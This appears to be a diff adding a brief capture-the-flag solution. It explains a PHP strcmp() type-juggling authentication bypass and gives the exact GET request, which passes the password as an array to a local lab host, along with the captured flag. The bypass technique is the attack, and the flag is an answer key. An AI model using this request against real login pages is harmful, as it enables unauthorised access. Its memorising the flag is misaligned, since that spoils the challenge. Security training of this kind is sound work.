@@ -1,0 +1,4 @@
+# PHP strcmp() type juggling bypass: passing password as array causes strcmp() to return NULL. In loose comparison (==), NULL == 0 is true, bypassing authentication. Username must be admin. Flag returned: flag{5a33e31a-7627-4044-964f-744917d6ca5f}
+
+GET /index.php?username=admin&password[]=anything HTTP/1.1
+Host: 172.17.0.1:43431
